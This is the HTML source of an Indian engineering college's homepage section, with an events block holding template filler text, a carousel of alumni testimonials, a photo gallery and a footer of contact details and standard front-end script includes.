            <div class="text pt-3 text-center">
              <h3>Ln. Dr. J. Bridget Nirmala</h3>
              <span class="position mb-2">CEO</span>
              <div class="faded">
                <p></p>
                <ul class="ftco-social text-center">
                  <li class="ftco-animate"><a href="#"><span class="icon-twitter"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-facebook"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-google-plus"></span></a></li>
                  <li class="ftco-animate"><a href="#"><span class="icon-instagram"></span></a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-section bg-light">
    <div class="container">
      <div class="row justify-content-center mb-5 pb-2">
        <div class="col-md-8 text-center heading-section ftco-animate">
          <h2 class="mb-4"><span>Recent</span> Events</h2>
          <p>Education is a never-ending source of knowledge, and our goal is to provide everyone with a great education.</p>
        </div>
      </div>
      <div class="row">
        <div class="col-md-6 col-lg-4 ftco-animate">
          <div class="blog-entry">
            <a href="#" class="block-20 d-flex align-items-end" style="background-image: url('images/college/image_1.jpg');">
              <div class="meta-date text-center p-2">
                <span class="day">22</span>
                <span class="mos">February</span>
                <span class="yr">2022</span>
              </div>
            </a>
            <div class="text bg-white p-4">
              <h3 class="heading"><a href="#">Skills To Develop Your Child Memory</a></h3>
              <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
              <div class="d-flex align-items-center mt-4">
                <p class="mb-0"><a href="#" class="btn btn-primary">Read More <span class="ion-ios-arrow-round-forward"></span></a></p>
                <p class="ml-auto mb-0">
                  <a href="#" class="mr-2">Admin</a>
                  <a href="#" class="meta-chat"><span class="icon-chat"></span> 3</a>
                </p>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 ftco-animate">
          <div class="blog-entry">
            <a href="#" class="block-20 d-flex align-items-end" style="background-image: url('images/college/image_2.jpg');">
              <div class="meta-date text-center p-2">
                <span class="day">25</span>
                <span class="mos">February</span>
                <span class="yr">2022</span>
              </div>
            </a>
            <div class="text bg-white p-4">
              <h3 class="heading"><a href="#">Skills To Develop Your Child Memory</a></h3>
              <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
              <div class="d-flex align-items-center mt-4">
                <p class="mb-0"><a href="#" class="btn btn-primary">Read More <span class="ion-ios-arrow-round-forward"></span></a></p>
                <p class="ml-auto mb-0">
                  <a href="#" class="mr-2">Admin</a>
                  <a href="#" class="meta-chat"><span class="icon-chat"></span> 3</a>
                </p>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-4 ftco-animate">
          <div class="blog-entry">
            <a href="#" class="block-20 d-flex align-items-end" style="background-image: url('images/college/image_3.jpg');">
              <div class="meta-date text-center p-2">
                <span class="day">28</span>
                <span class="mos">February</span>
                <span class="yr">2022</span>
              </div>
            </a>
            <div class="text bg-white p-4">
              <h3 class="heading"><a href="#">Skills To Develop Your Child Memory</a></h3>
              <p>Far far away, behind the word mountains, far from the countries Vokalia and Consonantia, there live the blind texts.</p>
              <div class="d-flex align-items-center mt-4">
                <p class="mb-0"><a href="#" class="btn btn-primary">Read More <span class="ion-ios-arrow-round-forward"></span></a></p>
                <p class="ml-auto mb-0">
                  <a href="#" class="mr-2">Admin</a>
                  <a href="#" class="meta-chat"><span class="icon-chat"></span> 3</a>
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-section testimony-section">
    <div class="container">
      <div class="row justify-content-center mb-5 pb-2">
        <div class="col-md-8 text-center heading-section ftco-animate">
          <h2 class="mb-4">Student Says About Us</h2>
          <p>Education is a never-ending source of knowledge, and our goal is to provide everyone with a great education.</p>
        </div>
      </div>
      <div class="row ftco-animate justify-content-center">
        <div class="col-md-12">
          <div class="carousel-testimony owl-carousel">
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs1.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>I am 2022 passed out CSE student , College has good infrastructure. very peaceful environment, Knowledgeable professors and teaching methodology was very good. Our college provide 100%placement to all the eligible students. college conducts many festivals and sports activities. overall its a good platform to learn all the things.</p>
                  <p class="name">S. Arul Jegan </p>
                  <span class="position">CSE(2018-2022)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs2.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>Excellent!..Had a great experience with education...Management of the college is good for students. Extracurricular activities were conducted every year to grow the student's capacity as a part of skill development.</p>
                  <p class="name">A. Pravin Esrone</p>
                  <span class="position">CSE(2017-2021)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs3.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>"I'm pursuing my post graduate..... SMCET is awell established College with good infrastructure, excellent faculties, security and ragging free campus"</p>
                  <p class="name">R Priyadarshini</p>
                  <span class="position">ME-Comm. Sys. (2020-2022)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs4.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>College has good infrastructure.college have upgraded lab equipments, library and many more. Their teaching methodology was very good.college provide 100%placement to all the eligible students.college conducts many fest and sports activities.campus was spacious, well maintained and clean.</p>
                  <p class="name">M.Hemavathy</p>
                  <span class="position">ECE (2016-2020)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs5.jpg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>I am a Electrical engineering student passed out in the year 2012. It's been an amazing experience studying at SMCET. They organize a lot of technical events, where they encourage our innovative ideas. I had well educated and skilled faculty members. The college also helps students with their projects, Conducts several seminars and workshops. The college infrastructure is very good with several facilities like sports ground, Canteen, seminar halls, labs, workshops etc, Hostel facilities are available for both boys and girls with different buildings within the campus. Nationalised bank is also available within the campus making more convenient.</p>
                  <p class="name">P. Yogi Manikandan</p>
                  <span class="position">EEE (2008-2012)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs6.jpg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>Its was nice and an emerged feeling being an Engineering college. I highly recommend SMCET, because of its methodology and many student friendly professors. There might be some restrictions that will be for the betterment of the engineering life, which makes you ready for a practical outside world</p>
                  <p class="name">P.C. Lefin</p>
                  <span class="position">EEE (2009-2013)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs7.png)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>It's a great place for who passionate about curriculum and way better place to prepare for the competitions of open world. As an alumni i feel proud for the decision to opt this collage. Both the management and staffs are well supportive in all affairs both internal and curricular</p>
                  <p class="name">AMALRAJ</p>
                  <span class="position">MECH (2015-2019)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs8.png)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>Good infrastructure and Good Faculties in Department of Mechanical Engineering</p>
                  <p class="name">Balaji S</p>
                  <span class="position">MECH (2018-2022)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs11.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>The management of the college is good for students because of they are maintaining good friendly relationship and students have close moment with management.I'm a 2014 passed out chemical engineering student</p>
                  <p class="name">Sivabalan P</p>
                  <span class="position">Chemical (2010-2014)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs12.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>This is a very good place where we accure lot of skills from quality staffs. I got more opportunities here to develop my personal skills.Staffs are very kind .we can able to create a new journey of Life here.I done my studies in chemical engineering here what an memories these college gave to me. This is wonderful place where we grow without limits</p>
                  <p class="name">Aravind Raja</p>
                  <span class="position">Chemical (2018-2022)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs13.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>Infrastructure is so good and Excellent teachers in My MBA department. I am feel very happy to proud alumni in our SMCET</p>
                  <p class="name">S.Karthik</p>
                  <span class="position">MBA (2020-2022)</span>
                </div>
              </div>
            </div>
            <div class="item">
              <div class="testimony-wrap d-flex">
                <div class="user-img mr-4" style="background-image: url(images/fbs/fbs14.jpeg)">
                </div>
                <div class="text ml-2">
                  <span class="quote d-flex align-items-center justify-content-center">
                    <i class="icon-quote-left"></i>
                  </span>
                  <p>Our SMCET provide entrepreneurial skill training & program it's helpful to my future . I am proud alumni in our SMCET and I wish upcoming batch of students in SMCET</p>
                  <p class="name">S.Gayathiri</p>
                  <span class="position">MBA (2020-2022)</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </section>
  <section class="ftco-gallery">
    <div class="container-wrap">
      <div class="row no-gutters">
        <div class="col-md-3 ftco-animate">
          <a href="images/image_1.jpg" class="gallery image-popup img d-flex align-items-center" style="background-image: url(images/college/course-1.jpg);">
            <div class="icon mb-4 d-flex align-items-center justify-content-center">
              <span class="icon-instagram"></span>
            </div>
          </a>
        </div>
        <div class="col-md-3 ftco-animate">
          <a href="images/image_2.jpg" class="gallery image-popup img d-flex align-items-center" style="background-image: url(images/college/image_2.jpg);">
            <div class="icon mb-4 d-flex align-items-center justify-content-center">
              <span class="icon-instagram"></span>
            </div>
          </a>
        </div>
        <div class="col-md-3 ftco-animate">
          <a href="images/image_3.jpg" class="gallery image-popup img d-flex align-items-center" style="background-image: url(images/college/image_3.jpg);">
            <div class="icon mb-4 d-flex align-items-center justify-content-center">
              <span class="icon-instagram"></span>
            </div>
          </a>
        </div>
        <div class="col-md-3 ftco-animate">
          <a href="images/image_4.jpg" class="gallery image-popup img d-flex align-items-center" style="background-image: url(images/college/image_4.jpg);">
            <div class="icon mb-4 d-flex align-items-center justify-content-center">
              <span class="icon-instagram"></span>
            </div>
          </a>
        </div>
      </div>
    </div>
  </section>
  <footer class="ftco-footer ftco-bg-dark ftco-section">
    <div class="container">
      <div class="row mb-5">
        <div class="col-md-6 col-lg-3">
          <div class="ftco-footer-widget mb-5">
            <h2 class="ftco-heading-2">Have a Questions? Please contact us:</h2>
            <div class="block-23 mb-3">
              <ul>
                <li><span class="icon icon-map-marker"></span><span class="text">St. Santhiyagappar Nagar, Kalayarkoil, Sivagangai District, Tamil Nadu, India.</span></li>
                <li><a href="#"><span class="icon icon-phone"></span><span class="text">+91 99427 96723</span></a></li>
                <li><a href="#"><span class="icon icon-envelope"></span><span class="text"><span class="__cf_email__" data-cfemail="4f262129200f3c222c2a3b612a2b3a612621">[email&#160;protected]</span></span></a></li>
              </ul>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-3">
          <div class="ftco-footer-widget mb-5">
            <h2 class="ftco-heading-2">Recent Blog</h2>
            <div class="block-21 mb-4 d-flex">
              <a class="blog-img mr-4" style="background-image: url(images/college/image_1.jpg);"></a>
              <div class="text">
                <h3 class="heading"><a href="#">Even the all-powerful Pointing has no control about</a></h3>
                <div class="meta">
                  <div><a href="#"><span class="icon-calendar"></span> June 27, 2021</a></div>
                  <div><a href="#"><span class="icon-person"></span> Admin</a></div>
                  <div><a href="#"><span class="icon-chat"></span> 19</a></div>
                </div>
              </div>
            </div>
            <div class="block-21 mb-5 d-flex">
              <a class="blog-img mr-4" style="background-image: url(images/college/image_2.jpg);"></a>
              <div class="text">
                <h3 class="heading"><a href="#">Even the all-powerful Pointing has no control about</a></h3>
                <div class="meta">
                  <div><a href="#"><span class="icon-calendar"></span> June 27, 2021</a></div>
                  <div><a href="#"><span class="icon-person"></span> Admin</a></div>
                  <div><a href="#"><span class="icon-chat"></span> 19</a></div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-6 col-lg-3">
          <div class="ftco-footer-widget mb-5 ml-md-4">
            <h2 class="ftco-heading-2">Links</h2>
            <ul class="list-unstyled">
              <li><a href="#"><span class="ion-ios-arrow-round-forward mr-2"></span>Home</a></li>
              <li><a href="#"><span class="ion-ios-arrow-round-forward mr-2"></span>About</a></li>
              <li><a href="#"><span class="ion-ios-arrow-round-forward mr-2"></span>Services</a></li>
              <li><a href="#"><span class="ion-ios-arrow-round-forward mr-2"></span>Departments</a></li>
              <li><a href="#"><span class="ion-ios-arrow-round-forward mr-2"></span>Contact</a></li>
            </ul>
          </div>
        </div>
        <div class="col-md-6 col-lg-3">
          <div class="ftco-footer-widget mb-5">
            <h2 class="ftco-heading-2">Subscribe Us!</h2>
            <form action="#" class="subscribe-form">
              <div class="form-group">
                <input type="text" class="form-control mb-2 text-center" placeholder="Enter email address">
                <input type="submit" value="Subscribe" class="form-control submit px-3">
              </div>
            </form>
          </div>
          <div class="ftco-footer-widget mb-5">
            <h2 class="ftco-heading-2 mb-0">Connect With Us</h2>
            <ul class="ftco-footer-social list-unstyled float-md-left float-lft mt-3">
              <li class="ftco-animate"><a href="#"><span class="icon-twitter"></span></a></li>
              <li class="ftco-animate"><a href="https://www.facebook.com/stmcet/" target="_blank"><span class="icon-facebook"></span></a></li>
              <li class="ftco-animate"><a href="https://www.instagram.com/smcet_kalayarkoil/" target="_blank"><span class="icon-instagram"></span></a></li>
            </ul>
          </div>
        </div>
      </div>
      <div class="row">
        <div class="col-md-12 text-center">
          <p> Copyright &copy;<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
            <script>
              document.write(new Date().getFullYear());
            </script> All rights reserved | This Website is made with <i class="icon-heart" aria-hidden="true"></i> by <a href="https://smcet.edu.in/edith" target="_blank">EDITH</a>
          </p>
        </div>
      </div>
    </div>
  </footer>
  <!-- loader -->
  <div id="ftco-loader" class="show fullscreen"><svg class="circular" width="48px" height="48px">
      <circle class="path-bg" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke="#eeeeee" />
      <circle class="path" cx="24" cy="24" r="22" fill="none" stroke-width="4" stroke-miterlimit="10" stroke="#F96D00" />
    </svg></div>
  <script src="js/jquery.min.js"></script>
  <script src="js/jquery-migrate-3.0.1.min.js"></script>
  <script src="js/popper.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.easing.1.3.js"></script>
  <script src="js/jquery.waypoints.min.js"></script>
  <script src="js/jquery.stellar.min.js"></script>
  <script src="js/owl.carousel.min.js"></script>
  <script src="js/jquery.magnific-popup.min.js"></script>
  <script src="js/aos.js"></script>
  <script src="js/jquery.animateNumber.min.js"></script>
  <script src="js/scrollax.min.js"></script>
  <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBVWaKrjvy3MaE7SQ74_uJiULgl1JY0H2s&sensor=false"></script>
  <script src="js/google-map.js"></script>
  <script src="js/main.js"></script>
</body>

</html>
